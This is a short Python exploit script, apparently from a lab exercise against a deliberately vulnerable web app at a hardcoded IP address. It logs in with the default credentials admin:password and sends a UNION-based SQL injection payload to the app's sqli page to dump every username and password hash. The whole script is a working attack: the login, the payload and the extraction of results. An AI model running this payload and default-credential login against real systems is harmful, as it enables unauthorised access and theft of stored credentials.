
import requests
import re
from urllib.parse import quote

session = requests.Session()
url = "http://31.97.117.123"

# Login with admin:password
login_page = session.get(f"{url}/login.php")
match = re.search(r"user_token'\s+value='([^']+)'", login_page.text)
user_token = match.group(1) if match else ""

data = {
    "username": "admin",
    "password": "password",
    "user_token": user_token,
    "Login": "Login"
}

response = session.post(f"{url}/login.php", data=data, allow_redirects=True)
print("[+] Login successful!")

# The query is: SELECT first_name, last_name FROM users WHERE user_id = '$id'
# So I need to make it: SELECT first_name, last_name FROM users WHERE user_id = '1' UNION SELECT user, password FROM users -- '
# This will select all users and their password hashes

# Try to extract all users with their passwords using UNION SELECT
payload = "1' UNION SELECT user, password FROM users -- "
print(f"\n[*] Testing payload: {payload}")
sqli_response = session.get(f"{url}/vulnerabilities/sqli/?id={quote(payload)}&Submit=Submit")

# Extract results
print("[*] Response snippet:")
if "First name:" in sqli_response.text:
    # Extract the relevant section
    match = re.search(r'<pre>ID:.*?First name:.*?</pre>', sqli_response.text, re.DOTALL)
    if match:
        print(match.group(0))
        
# Print full response for inspection
print("\n[*] Full response:")
print(sqli_response.text)


